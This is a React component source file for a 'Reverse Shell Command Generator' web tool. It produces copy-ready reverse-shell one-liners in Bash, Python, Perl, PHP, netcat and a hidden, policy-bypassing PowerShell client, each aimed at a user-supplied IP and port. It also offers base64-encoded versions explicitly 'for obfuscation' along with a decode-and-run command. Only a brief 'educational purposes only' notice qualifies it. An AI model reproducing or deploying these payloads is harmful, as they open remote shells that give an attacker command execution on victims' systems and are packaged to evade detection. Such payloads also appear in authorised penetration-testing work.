
import React, { useState, useEffect } from 'react';
import { Terminal, Server, Network, TerminalSquare, Settings } from 'lucide-react';
import { Input } from '@/components/ui/input';
import { Label } from '@/components/ui/label';
import { RadioGroup, RadioGroupItem } from '@/components/ui/radio-group';
import { Tabs, TabsContent, TabsList, TabsTrigger } from '@/components/ui/tabs';
import { Card, CardContent } from '@/components/ui/card';
import ShellOption from './ShellOption';
import CopyButton from './CopyButton';

interface ShellType {
  id: string;
  name: string;
  icon: React.ReactNode;
}

const shellTypes: ShellType[] = [
  { id: 'bash', name: 'Bash', icon: <Terminal size={16} /> },
  { id: 'python', name: 'Python', icon: <TerminalSquare size={16} /> },
  { id: 'perl', name: 'Perl', icon: <Terminal size={16} /> },
  { id: 'php', name: 'PHP', icon: <TerminalSquare size={16} /> },
  { id: 'netcat', name: 'Netcat', icon: <Network size={16} /> },
  { id: 'powershell', name: 'PowerShell', icon: <Terminal size={16} /> }
];

const CommandGenerator: React.FC = () => {
  const [ip, setIp] = useState('10.0.0.1');
  const [port, setPort] = useState('4444');
  const [selectedShell, setSelectedShell] = useState('bash');
  const [protocol, setProtocol] = useState('tcp');
  const [generatedCommand, setGeneratedCommand] = useState('');
  const [encodedCommand, setEncodedCommand] = useState('');

  useEffect(() => {
    generateCommand();
  }, [ip, port, selectedShell, protocol]);

  const generateCommand = () => {
    let command = '';
    let encoded = '';
    
    switch(selectedShell) {
      case 'bash':
        command = `bash -i >& /dev/tcp/${ip}/${port} 0>&1`;
        encoded = btoa(command);
        break;
      case 'python':
        command = `python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("${ip}",${port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'`;
        encoded = btoa(command);
        break;
      case 'perl':
        command = `perl -e 'use Socket;$i="${ip}";$p=${port};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'`;
        encoded = btoa(command);
        break;
      case 'php':
        command = `php -r '$sock=fsockopen("${ip}",${port});exec("/bin/sh -i <&3 >&3 2>&3");'`;
        encoded = btoa(command);
        break;
      case 'netcat':
        command = `nc -e /bin/sh ${ip} ${port}`;
        encoded = btoa(command);
        break;
      case 'powershell':
        command = `powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("${ip}",${port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()`;
        encoded = btoa(command);
        break;
      default:
        command = `bash -i >& /dev/tcp/${ip}/${port} 0>&1`;
        encoded = btoa(command);
    }

    setGeneratedCommand(command);
    setEncodedCommand(encoded);
  };

  return (
    <div className="w-full max-w-4xl mx-auto">
      <h2 className="text-xl md:text-2xl font-bold mb-6 text-center text-neon-green">Reverse Shell Command Generator</h2>
      
      <div className="grid grid-cols-1 md:grid-cols-3 gap-4 mb-6">
        <div className="space-y-2">
          <Label htmlFor="ip" className="text-sm font-medium">IP Address / Host</Label>
          <div className="flex items-center space-x-2">
            <Server className="h-4 w-4 text-muted-foreground" />
            <Input
              id="ip"
              value={ip}
              onChange={(e) => setIp(e.target.value)}
              placeholder="Enter IP Address"
              className="border-neon-green/30 bg-dark-secondary focus:border-neon-green"
            />
          </div>
        </div>
        
        <div className="space-y-2">
          <Label htmlFor="port" className="text-sm font-medium">Port</Label>
          <div className="flex items-center space-x-2">
            <Network className="h-4 w-4 text-muted-foreground" />
            <Input
              id="port"
              value={port}
              onChange={(e) => setPort(e.target.value)}
              placeholder="Enter Port"
              className="border-neon-green/30 bg-dark-secondary focus:border-neon-green"
            />
          </div>
        </div>
        
        <div className="space-y-2">
          <Label className="text-sm font-medium">Protocol</Label>
          <RadioGroup 
            value={protocol} 
            onValueChange={setProtocol}
            className="flex space-x-4"
          >
            <div className="flex items-center space-x-2">
              <RadioGroupItem value="tcp" id="tcp" className="border-neon-green text-neon-green" />
              <Label htmlFor="tcp" className="text-sm">TCP</Label>
            </div>
            <div className="flex items-center space-x-2">
              <RadioGroupItem value="udp" id="udp" className="border-neon-green text-neon-green" />
              <Label htmlFor="udp" className="text-sm">UDP</Label>
            </div>
          </RadioGroup>
        </div>
      </div>
      
      <div className="mb-8">
        <Label className="text-sm font-medium mb-2 block">Shell Type</Label>
        <div className="flex flex-wrap gap-2">
          {shellTypes.map(shell => (
            <ShellOption
              key={shell.id}
              name={shell.name}
              icon={shell.icon}
              isActive={selectedShell === shell.id}
              onClick={() => setSelectedShell(shell.id)}
            />
          ))}
        </div>
      </div>
      
      <Tabs defaultValue="raw" className="w-full">
        <TabsList className="w-full grid grid-cols-2 mb-4 bg-dark-tertiary">
          <TabsTrigger value="raw" className="data-[state=active]:bg-dark-secondary data-[state=active]:text-neon-green">
            Raw Command
          </TabsTrigger>
          <TabsTrigger value="encoded" className="data-[state=active]:bg-dark-secondary data-[state=active]:text-neon-green">
            Base64 Encoded
          </TabsTrigger>
        </TabsList>
        
        <TabsContent value="raw">
          <Card className="bg-dark-secondary border-neon-green/20">
            <CardContent className="p-0">
              <div className="code-block relative group">
                <pre className="terminal-text pr-8">{generatedCommand}</pre>
                <div className="absolute top-4 right-4">
                  <CopyButton text={generatedCommand} />
                </div>
              </div>
              
              <div className="p-4 text-xs text-muted-foreground">
                <p className="flex items-center gap-2">
                  <Settings className="h-3 w-3" />
                  Adjust parameters above to customize the command
                </p>
              </div>
            </CardContent>
          </Card>
        </TabsContent>
        
        <TabsContent value="encoded">
          <Card className="bg-dark-secondary border-neon-green/20">
            <CardContent className="p-0">
              <div className="code-block relative group overflow-x-auto">
                <pre className="terminal-text pr-8 overflow-x-auto">{encodedCommand}</pre>
                <div className="absolute top-4 right-4">
                  <CopyButton text={encodedCommand} />
                </div>
              </div>
              
              <div className="p-4 text-xs flex justify-between items-center">
                <span className="text-muted-foreground">
                  Base64 encoded command for obfuscation
                </span>
                <span className="text-xs terminal-text">
                  echo "{encodedCommand}" | base64 -d | bash
                </span>
              </div>
            </CardContent>
          </Card>
        </TabsContent>
      </Tabs>
      
      <div className="mt-6 p-4 bg-dark-secondary border border-yellow-600/20 rounded-md">
        <p className="text-yellow-400 text-sm flex items-start gap-2">
          <span className="text-yellow-400 font-bold">⚠️</span>
          <span>For educational purposes only. Always ensure you have proper authorization before using these commands.</span>
        </p>
      </div>
    </div>
  );
};

export default CommandGenerator;
